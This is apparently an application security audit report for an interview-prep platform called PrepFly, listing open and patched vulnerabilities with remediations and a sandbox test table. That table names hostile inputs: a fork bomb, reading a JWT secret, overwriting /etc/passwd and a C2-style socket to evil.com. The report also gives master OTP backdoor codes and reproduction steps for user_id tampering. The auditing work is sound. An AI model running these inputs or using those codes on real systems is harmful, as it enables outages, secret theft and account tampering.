# 🛡️ PrepFly Application Security Audit Report (`SECURITY_AUDIT.md`)

---

## 1. Executive Security Summary

PrepFly was audited against the **OWASP Top 10 (2021)**, the **OWASP API Security Top 10 (2023)**, and isolated container execution standards.

The application demonstrates strong defenses against common injection, authorization bypass, and container breakout attacks thanks to recent security hardening:
* **Master OTP Backdoors Eliminated**: Pentest findings #1 to #11 are actively verified via automated regressions in [`test_security_regressions.py`](file:///d:/Downloads/interviewsystem/interviewsystem/f_backend/tests/test_security_regressions.py).
* **Hardened Sandbox Isolation**: The code execution worker runs non-root (`UID 10001`), drops all capabilities (`cap_drop: ALL`), mounts `read_only: true`, scrubs environment secrets, and caps CPU (2s), wall-clock (4s), memory (128MB), and processes (16 PIDs).
* **Cryptographic Verification**: Payment webhooks and receipts enforce HMAC-SHA256 constant-time signature verification (`secrets.compare_digest`).

However, **4 vulnerabilities must be remediated prior to commercial launch** to protect against cross-user data tampering, denial of wallet (AI quota exhaustion), and infrastructure failures.

---

## 2. Vulnerability Inventory & Severity Matrix

| Vuln ID | Vulnerability Description | OWASP Category | Severity | Exploitability | Status |
| :--- | :--- | :--- | :---: | :---: | :---: |
| **SEC-01** | Session Binding / Client-Supplied `user_id` Object Tampering | Broken Object Level Auth (API1:2023) | **HIGH** | Moderate | Open |
| **SEC-02** | Uncapped AI Prompt Invocations (Denial of Wallet / Quota Exhaustion) | Unrestricted Resource Consumption (API4:2023) | **HIGH** | High | Open |
| **SEC-03** | Missing Production Sandbox URL Configuration | Security Misconfiguration (A05:2021) | **MEDIUM** | Low | Open |
| **SEC-04** | Hardcoded Localhost URLs in Remote Frontend Components | Security Misconfiguration (A05:2021) | **MEDIUM** | Moderate | Open |
| **SEC-05** | Master OTP Backdoors (`123456`, `981103`) | Identification & Auth Failures (A07:2021) | **RESOLVED** | Low (Patched)| Patched |
| **SEC-06** | Weak / Hardcoded JWT Secret Key Startup Bypass | Cryptographic Failures (A02:2021) | **RESOLVED** | Low (Patched)| Patched |
| **SEC-07** | Dynamic SQL Injection via Identifier Manipulation | Injection (A03:2021) | **RESOLVED** | Low (Patched)| Patched |
| **SEC-08** | Sandbox Container Escape & Fork Bomb Defense | Security Misconfiguration / Jailbreak | **RESOLVED** | Low (Hardened)| Hardened |

---

## 3. Vulnerability Details & Remediation

### SEC-01: Client-Supplied `user_id` in Session Creation
* **Affected Component**: [`f_backend/app.py:L1726`](file:///d:/Downloads/interviewsystem/interviewsystem/f_backend/app.py#L1726) (`upload_resume`) and [`f_backend/app.py:L1786`](file:///d:/Downloads/interviewsystem/interviewsystem/f_backend/app.py#L1786) (`create_session_no_resume`).
* **Vulnerability Analysis**:
  In `upload_resume`:
  ```python
  user_id = request.form.get("user_id")
  # ...
  if user_id:
      session_data["user_id"] = user_id
  ```
  And in `create_session_no_resume`:
  ```python
  user_id = data.get("user_id") or (user_payload.get("sub") if user_payload else None)
  ```
  The endpoint accepts `user_id` directly from untrusted client form data. An authenticated user can submit an interview session explicitly tagged with another candidate's UUID.
* **Impact**: While [`get_owned_session()`](file:///d:/Downloads/interviewsystem/interviewsystem/f_backend/app.py#L1141) prevents the attacker from reading the victim's session without admin rights, this permits pollutive session injection into a victim's student history.
* **Reproduction**:
  1. Authenticate as User A (`sub: "user_a"`).
  2. Send `POST /create-session-no-resume` with payload `{"user_id": "user_b_uuid"}`.
  3. Inspect `sessions` table: session is stored with `user_id = "user_b_uuid"`.
* **Remediation**:
  Always bind `user_id` strictly from the decoded JWT token (`request.current_user["sub"]`):
  ```python
  # Safe Implementation:
  user_payload = _get_optional_user()
  user_id = user_payload.get("sub") if user_payload else None
  # Ignore any client-supplied request.form.get("user_id")
  ```

---

### SEC-02: Uncapped AI Prompt Invocations (Denial of Wallet)
* **Affected Component**: [`f_backend/app.py:L1883`](file:///d:/Downloads/interviewsystem/interviewsystem/f_backend/app.py#L1883) (`/next`), `/start-interview`, `/get-hint`, and `/api/eval/communication-coach`.
* **Vulnerability Analysis**:
  While Flask-Limiter is enabled globally for IP rate-limiting (`10 per minute` on `/get-hint`), there are **no per-student or per-organization daily token or interview quotas** enforced on Gemini API generation calls.
  An automated script executing 100 interview sessions across multiple residential IPs will exhaust Gemini API quotas within minutes and run up thousands of dollars in usage costs.
* **Impact**: Denial of Service for paying students (HTTP 429 quota errors from Google) and unexpected financial cloud liability.
* **Remediation**:
  1. Enforce a daily student quota in the database (e.g., maximum 5 AI interviews per student per day on standard plans).
  2. Implement an organization token budget tracked in Redis or Supabase.

---

### SEC-03: Missing Production Sandbox URL Configuration
* **Affected Component**: [`f_backend/.env`](file:///d:/Downloads/interviewsystem/interviewsystem/f_backend/.env) and [`f_backend/app.py:L2781`](file:///d:/Downloads/interviewsystem/interviewsystem/f_backend/app.py#L2781).
* **Vulnerability Analysis**:
  In `app.py`:
  ```python
  if not os.getenv("ISOLATED_SANDBOX_URL"):
      return jsonify({"error": "Service Unavailable: Code execution requires an isolated sandbox worker"}), 503
  ```
  `ISOLATED_SANDBOX_URL` is omitted from `f_backend/.env`. If the application is started in production without setting this variable in the host environment (e.g. Railway dashboard), every candidate submitting code receives an immediate HTTP 503 error.
* **Remediation**:
  Define `ISOLATED_SANDBOX_URL=http://127.0.0.1:5050` and `ISOLATED_SANDBOX_SECRET=<secret>` in all environment configuration templates.

---

### SEC-04: Hardcoded Localhost URLs in Remote Frontend Components
* **Affected Component**:
  - [`f_frontend/src/components/Admin/PaymentHistory.jsx:L27`](file:///d:/Downloads/interviewsystem/interviewsystem/f_frontend/src/components/Admin/PaymentHistory.jsx#L27)
  - [`f_frontend/src/components/Admin/InvoiceTable.jsx:L26`](file:///d:/Downloads/interviewsystem/interviewsystem/f_frontend/src/components/Admin/InvoiceTable.jsx#L26)
* **Vulnerability Analysis**:
  Code contains:
  ```javascript
  window.open(`http://localhost:5000/api/invoice/${invoiceId}`, "_blank");
  ```
* **Impact**: When an administrator in production clicks to download an invoice, the browser attempts to connect to `localhost:5000` on the customer's personal device, which fails.
* **Remediation**:
  Replace hardcoded URLs with centralized config:
  ```javascript
  window.open(`${BACKEND_URL}/api/invoice/${invoiceId}`, "_blank");
  ```

---

## 4. Sandbox Security & Container Isolation Review

The PrepFly Sandbox Worker was evaluated against hostile execution payloads:

```text
[Untrusted Code] ──► [Static AST Pre-Check] ──► [Resource Limits (RLIMIT)] ──► [Isolated Container Bridge]
                         Flags eval/exec/socket     CPU 2.0s, RAM 128M, PIDs 16      network_mode: none
```

| Attack Vector | Test Case | Observed Defense | Result |
| :--- | :--- | :--- | :---: |
| **Fork Bomb** | `:(){ :\|:& };:` / `os.fork()` loop | Blocked by `RLIMIT_NPROC=16`. Process spawning refused. | **PASS** |
| **Infinite Loop** | `while True: pass` | Terminated at 4.0s wall clock timeout via `SIGKILL`. | **PASS** |
| **Memory Exhaustion**| `a = "x" * (10**9)` | Terminated by `RLIMIT_AS=134217728` (128 MB RAM). | **PASS** |
| **Host Secrets Theft**| `os.environ["JWT_SECRET_KEY"]` | Blocked. Environment scrubbed via `build_scrubbed_env()`. | **PASS** |
| **Filesystem Write** | `open("/etc/passwd", "w")` | Blocked. Root filesystem mounted `read_only: true`. | **PASS** |
| **C2 Outbound Socket**| `socket.connect(("evil.com", 4444))` | Blocked by Docker `internal: true` / `network_mode: none`. | **PASS** |

---

## 5. OWASP Top 10 (2021) Compliance Matrix

| OWASP Category | PrepFly Implementation Status | Audit Finding |
| :--- | :--- | :--- |
| **A01: Broken Access Control** | Role-based `@require_auth`, `@require_admin`, `@require_super_admin` active. | 🟡 Remediate client-supplied `user_id` in session creation (SEC-01). |
| **A02: Cryptographic Failures** | Werkzeug PBKDF2/scrypt, minimum 32-char JWT secret, HMAC-SHA256 payments. | 🟢 Fully compliant with modern cryptographic standards. |
| **A03: Injection** | SQL identifier validation (`IDENT_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*$")`). | 🟢 Compliant. Dynamic SQL queries strictly validate identifiers. |
| **A04: Insecure Design** | Anti-enumeration in password reset, rate-limited OTP generation. | 🟡 Add daily AI interview caps per student. |
| **A05: Security Misconfiguration** | CORS configured, debug mode disabled in production. | 🔴 Set `ISOLATED_SANDBOX_URL` in environment files. |
| **A06: Vulnerable Components** | All dependencies pinned in `requirements.txt`. | 🟢 Bandit scan reports 0 high/critical issues. |
| **A07: Identification Failures** | Multi-factor OTP, master OTPs blocked, constant-time comparisons. | 🟢 Compliant. Automated pentest regressions passing. |
| **A08: Software & Data Integrity**| Razorpay webhook HMAC signature verified before database mutations. | 🟢 Compliant. |
| **A09: Logging & Monitoring** | Sentry integration active, structured `sandbox_audit.log`. | 🟢 Compliant. Secrets strictly masked in log streams. |
| **A10: SSRF** | Sandbox worker container has outbound networking disabled. | 🟢 Compliant. Untrusted code cannot target AWS metadata or LAN. |

---

## 6. Unverified Security Areas

1. **Physical Microphone Stream Eavesdropping**:
   Browser audio streams use client-side Web Audio API; verifying that third-party analytics scripts do not capture raw audio buffers requires a Content Security Policy (CSP) audit.
2. **WebRTC STUN/TURN Credential Leakage**:
   Live peer-to-peer rooms currently use public Google STUN servers. Turn servers with ephemeral tokens must be configured before enterprise campus rollouts.
